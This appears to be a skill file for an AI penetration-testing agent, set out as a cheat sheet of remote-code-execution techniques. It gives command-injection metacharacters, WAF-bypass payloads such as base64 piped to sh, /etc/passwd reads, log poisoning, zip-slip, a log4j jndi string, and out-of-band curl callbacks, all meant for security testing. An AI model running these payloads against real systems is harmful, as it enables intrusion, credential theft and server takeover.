---
name: rce
description: >-
  Remote code execution chains — OS command injection, arbitrary file write/read,
  zip-slip, XXE→RCE, LFI→log poisoning, dependency confusion, LaTeX/TeX injection,
  eval-style injection, prototype-pollution gadgets. Auto-invoke when: shell-metachar
  inputs, file write/upload sinks, archive extraction, `include`/`eval`/`exec`-sounding
  params, parser libraries on attacker files. Do NOT load for: template engines →
  `ssti`; upload-only surfaces → `file_upload`; serialized blobs → `deserialization`.
family: sink-signal
severity: critical
---

# RCE — command · file-write · archives · parsers · chains

> **Arsenal:** arbitrary command execution / webshell on the server, then data, infra, cloud.
> **Sibling:** `ssti`, `deserialization`, `file_upload`, `sqli` (DBMS→file), `ssrf`
> (internal services), `llm_prompt_injection` (agent tool-call hijack) — the RCE arrival
> routes are half the hunting.
> **Proof bar:** actual command output/effect (in-band, file, or OOB callback) — not the
> detection echo.
> **Setup:** a sink that passes data into a process, file system, or parser. OAST ready.

## WAF Bypass (RCE)
- Command metachars: `` ` `` `$()` `;` `&&` `||` `|` `%0a` newline · bypass filters with `${IFS}` (space), `$()`, case `Id`
- Quoting dance: `'i''d'` `"i""d"` `\i\d` escaped · base64: `echo <b64>|base64 -d|sh` when metachars filtered
- Whitespace-free: `${IFS}`, `$IFS$9`, `<` redirects `cat</etc/passwd`, brace expansion `{cat,/etc/passwd}`
- Evaluation injection: `eval("id")` JS/PHP `eval`, `exec`, `system`-named params — string-built code (OGNL/SpEL/EL → `ssti` boundary)
- Newline-enc `%0a` in headers/user-agent sinks; newline in multipart filenames
- Archive traversal: `../` in zip/7z entry names — validation happens per-entry or not at all?

## Context
- RCE arrives via MANY doors: command builder (ping/ping host+param), file write (path traversal,
  upload, config), archive extractor (zip-slip), parser library (ImageMagick, Ghostscript, LaTeX,
  ffmpeg, XML), dependency resolver, SSRF→internal service, SQLi stacked. Each door needs its own
  approach; the PRIMITIVE (command/file/parser access) is the shared denouement.

## General Techniques
- **Command injection:** `ping;id` / `$(id)` / `` `id` `` in params feeding shell; test each metachar family separately
- **Arbitrary file write:** traversal in write paths (`../` names), overwrite `.htaccess`/`web.config`/cron/`authorized_keys`/webshell
- **Zip-slip:** malicious archive with `../../` entries → file overwrite on extraction (RCE when overwriting web path/config)
- **LFI → RCE:** `/etc/passwd` read → log poisoning (`/var/log/apache2/access.log` + User-Agent shell) → `php://filter` chains
- **XXE → RCE:** PHP `expect://` wrapper; external DTD OOB read (→ `info_disclosure` for XXE infra)
- **Dependency confusion:** private package name public-registered with higher version → CI installs it
- **LaTeX injection:** `\write18{id}` shell-escape in .tex compilation contexts
- **Prototype pollution:** `__proto__`/`constructor` JSON key → Node gadget chains (`child_process.execArgv`)
- **eval/EL injection:** OGNL/SpEL/JS eval/Ruby `send`-driven sinks with serialized/expression input
- **SSRF→internal RCE:** redis gopher, unauthed debug consoles (Jenkins, Solr, ES) (→ `ssrf`)
- **SQLi→file primitives:** `INTO OUTFILE` (MySQL), `xp_cmdshell` (MSSQL), `COPY FROM PROGRAM` (PG) (→ `sqli`)
- **Deserialization→RCE:** ysoserial/phpggc gadget chains (→ `deserialization`)
- **Upload-parser→RCE:** ImageTragick/PDF/ffmpeg payload files (→ `file_upload`)
- **Env-driven RCE:** `GIT_*` hooks, `BASH_ENV`, `NODE_OPTIONS`-style env array in cloud tasks

## Second-Order & Bypass Techniques
- Store payload in filename/username → executed by cron/rename/cleanup jobs later
- Command built CLIENT-side sanitized, but server splits on different separator (parser differential Shell vs PHP `shell_exec`)
- Reciprocal slashes: Windows `&` vs Linux `;` — test both when OS unknown

## Auth Bypass Techniques
- LFI of `wp-config.php`/`.env` → secrets → SSH/console access (→ `recon-secrets`)
- `/proc/self/environ` / `/proc/self/cmdline` leaks runtime creds → service login

## Header Techniques
- `User-Agent`/`X-Forwarded-For`/`Referer` written into logs → log-poison RCE via header payload with `%0a`
- `Host` header into `mail()`/`system()` sinks on legacy mailers

## CVE on Sight
| CVE | Surface | Class |
|---|---|---|
| CVE-2025-55182/66478 | React Server Components | Flight-protocol deserialize RCE |
| CVE-2023-36664 | Ghostscript ≤ 10.0.0 | document sanitizer RCE |
| CVE-2021-44228 | log4j 2.x | `${jndi:ldap://...}` header RCE |
| CVE-2022-22965 (Spring4Shell) | Spring MVC | class-binding RCE |
| CVE-2020-14422/14421 | Wordpress plugins family | file-write RCE |
| CVE-2019-14271 | Docker cp | host-root escape (host-level) |

## Indicators — record as `possible` when seen
- Params named `cmd` `exec` `run` `ping` `shell` `system` `eval` `template` `include` `file` `path` `save` `write`
- Shell metacharacters pass through unencoded (`;` `|` `` ` `` `$()` in echo)
- Upload/import/archive/extract features; `processes`-listing endpoints; debug consoles (actuator/gitlab/grafana)
- Error strings revealing `system()`/`exec`/`popen` or OS paths

## Tools
- `curl -s 'URL/ping?host=127.0.0.1%3Bid'` — expect command output echo
- OAST: interactsh for blind command OOB (`curl http://ID.oast.site`)
- Burp: command-injection macros; `ysoserial`/`phpggc` for deserialize chains (YOUR test servers only)
- `nuclei -tags rce` for triage; verify every hit by hand with a unique marker (`id; echo HUNTERSIG`)